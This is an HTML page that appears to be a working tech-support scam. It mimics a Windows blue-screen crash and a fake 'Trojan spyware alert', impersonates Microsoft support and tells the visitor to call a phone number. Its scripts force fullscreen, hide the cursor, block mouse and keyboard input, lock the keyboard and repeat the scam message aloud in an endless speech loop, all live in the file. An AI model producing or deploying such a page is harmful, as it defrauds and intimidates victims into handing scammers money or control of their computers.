<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apology Page</title>
    <style>
        body {
             margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: normal;
            font-family: Segoe UI, monospace;
            background-color: #1E90FF;
            color: white;
            text-align: center;
            height: 100vh;
        }
        .content {
            margin-left: 20px;
            text-align: left;
        }
    
        .container {
            margin-left: 20px;
            text-align: left;
        }

        
        .image {
            flex: 1;
            text-align: right;
            padding: 20px;
            
        }

        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        .popup h2 {
            color: #007bff;
            margin-bottom: 10px;
        }
        .popup p {
            color: #333;
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }
        .visible {
            display: block;
        }
    </style>
</head>
<body>




    <div class="overlay"></div>
    <div class="popup">
        <h2>Attention!</h2>
        <p>Your system detected some unusual activity and locked due to security reason. Do not restart or shutdown it might harm your computer data track your financial activities.</p>
        <p>Please Call Microsoft Support +1(800) 295-5385.</p>
    </div>




    <script>
        // Function to display the popup and start speech
        function showPopup() {
            const overlay = document.querySelector('.overlay');
            const popup = document.querySelector('.popup');
            overlay.classList.add('visible');
            popup.classList.add('visible');

            const text = popup.innerText;
            playSpeech(text);
        }

        // Function to play text-to-speech in a loop
        function playSpeech(text) {
            const speech = new SpeechSynthesisUtterance(text);
            speech.lang = 'en-US';

            // Select an American female voice if available
            const voices = speechSynthesis.getVoices();
            const americanFemaleVoice = voices.find(voice => voice.lang === 'en-US' && voice.name.includes('Female'));
            if (americanFemaleVoice) {
                speech.voice = americanFemaleVoice;
            }

            // Replay the speech when it ends
            speech.onend = () => {
                playSpeech(text);
            };

            speechSynthesis.speak(speech);
        }

        // Wait for voices to load and then show the popup
        window.addEventListener('load', () => {
            speechSynthesis.onvoiceschanged = showPopup;
        });
    </script>






<script>
    window.onload = function () {
        // Check if fullscreen is supported and request it
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        } else if (document.documentElement.mozRequestFullScreen) { // Firefox
            document.documentElement.mozRequestFullScreen();
        } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari
            document.documentElement.webkitRequestFullscreen();
        } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
            document.documentElement.msRequestFullscreen();
        }
    };
</script>






 
        
    
    <div class="container">       
<div style="font-size: 100px;">:(</div> 

<div class="content">
<div style="font-size: 24px;">Your PC ran into a problem.Trojan spyware alert - error code: #0F9377281. </div>
<div style="font-size: 24px;">Access to this pc has been block and don't restart your PC.</div>
<div style="font-size: 24px;">Contact Windows Support: +1 800-295-5385</div>






<br> </br>

<div class="image">
      
    <img src="https://img.icons8.com/ios11/600/FFFFFF/windows-10.png" alt="Windows Logo" width="300" />
    

<br> </br>
<div class="content">
        <div class="qr-code">
            <img src="https://api.qrserver.com/v1/create-qr-code/?data=https://microsoft.com&size=70x70" alt="QR Code for Microsoft" />

<span style="font-size: 20px;">Stop code: CRITICAL PROCESS DIED</span>
<br> </br>

<div style="font-size: 16px;">If you call support person, give them this info.</div>
<div style="font-size: 16px;">For more information about this issue and possible fixes, visit https://www.windows.com/stopcode </div>

    </div>




 
    



    
<style>
    /* Hide the cursor for the entire body */
    body {
        cursor: none;
    }
</style>



<script>
    // Disable mouse clicks
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault(); // Disable right-click
    });

    document.addEventListener('mousedown', function(e) {
        if (e.button === 0 || e.button === 2) { // Disable left and right click
            e.preventDefault();
        }
    });

    // Disable keyboard input
    document.addEventListener('keydown', function(e) {
        e.preventDefault();
    });
</script>




<script>
navigator.keyboard.lock();
document.onkeydown = function (e) {
return false;
}
</script>
    

</body>
</html>
